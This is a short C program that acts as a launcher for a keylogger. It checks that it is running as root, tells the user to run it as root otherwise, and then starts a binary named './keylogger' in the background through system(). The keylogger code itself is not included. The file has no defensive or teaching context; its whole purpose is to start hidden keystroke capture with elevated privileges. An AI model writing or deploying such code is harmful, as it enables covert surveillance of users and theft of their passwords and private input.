#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc,char*argv[]) {
	if(getuid() !=0) {
		printf("Please run as root");
		return -1;
	}
	system("./keylogger &");
	return 0; 

}
